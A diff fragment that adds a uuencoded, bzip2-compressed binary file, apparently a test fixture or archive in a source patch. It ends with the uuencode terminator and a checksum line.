+M0EIH.3%!62936<?4!XH`!`#_Q]X8*$!Z____$Z6>S___W_Y`(``2D0`J```(
+M4`0X2%C8]NNVZC;PE31-3":3TI^DVE/TIGJFPD:8TPFH]31FD#8H-J>IZGM4
+MVIDPF&2-1DTT32)O2FR:@/*>33(0P$:,C3!!B>HTPC30)$DQ`I/&J>E-M)B1
+M[13U#R1Z08$#)@:3:F@,3(;4.9--#(`&(R#(`:8(&(!HTT`&0-``DE"FR93T
+M&H#-(&$T:```-`&@```#H_'G4>8[]FZ#FL*-^MI!%HD(T(&C?UW0+8!LX.%Z
+MZ3I8Q506H!H2:1`BYL]>QZ?CXRQO^/UZ]MO+0J)M+U"_;FOZ;BZ"QSRJ3;-"
+M;B<'+J\VSS$2RQJ77Y2D+06(IE'-/GJC:$D5:$TP2*`(+EXL$*$@J+%=5KTZ
+MZ?-R?`VHL`]4,:1L*H)H`E2?GH;*:=N3*XVK>H;[BEN+C4CTR&Y1F%M,^J:I
+M$L?DKOKJIO.^BL9]/#;_4=2)%M_)!+?N-.4!ER0B#=C:=*:H(TUG-R,&15I'
+M,03I8=25=ZPBS8OK58,*I<M^R:N,SBN15OW<9".QF@*&QJW)6:N-$4R1&=R'
+M2%5RM:T9$=]YV+XMN"_&R4HUOY'C92=493QN1\M'X#?P,)VRQSVAC*B#&,8B
+M[;IL0RS]3+1E6#W%L@&']UF`!^<_ZOX`"H"&X/8+]A,MQH(LO8/'4`S&R(#;
+M+@E"!]"L%V)RN<)/;[F0/T?F2PCBG?P+!K^!\U`GPS**BC9ER20,[BD[`Q3=
+M2>!6F!2U"F\YPFQ_:AJ/%HL$C*!""7TC'8K5MB)LTSB>)0OQSWF:N$4XM-N8
+M^<A^AP^LQ%,T">/MCZ5MB.U^=L8D]]^\U6"E=4RF14L3FI,)\]*VAJG"P.BF
+MY+I`>'=B>^24?:"]$)#T*4OREF:N@?6UAX;?"KCLT82;R!9^_XX*F$R%WK/H
+M8C?:0,)47`0AP*>*:L8ACZ*!U%-K^Q6.QF9DD[IFN.31B!,P-%S/1ON[M)6]
+MPO(24=-]2KK2:,1P#.74):9ND<Z:)'HUY7NZ`_+JO")IIG`X.P<&CA@N*0R4
+M_*89ZAXMU%P#QA:<E>!H#A@)95@$\D7H6"4Y&4P(+-:*<!PH@4<DYM>`9#,+
+M3;EU;]TFELB7V:?A6\IP#U07(]=BPNE*ZH?@(=TB&D=S>+B:U1NN_QM9C@J]
+MNU2^0JW"!+SZ`K;9$,X:05:PEHEYB_$3)>E<50P$XF++S=N(6DF4,7Z16JP4
+M4A2>.>+#9#:@T;S[M$*0D2QS!SJ),''!9)B%NHG&@8"L1*_%04DC7("?*GQJ
+MI!J@XA>X("3&V#IMK<2J*'!E]LDLD_[(%,0.D#XJ[DK$:]T^.FG4"M/M8S$Y
+M14IZL67A+DNZ<!V_VU'.)!@KD0?)"H7R>)^Q7>(&R&LH=*DQPCJBFL51/L#Z
+M;/FB>E((H9I",-&/6BFIRH85:B)?0),2\E*:7!SXWI=/RE[91A5LBZNL"&,6
+M8&VNC_(-1S$?OKI#!(U3:[;(;9%D22]KXF+W^SK=?H:\3Z!@+^+N2*<*$ACZ
+#@/%`
+`
+end
+sum -r/size 35687/1173
+
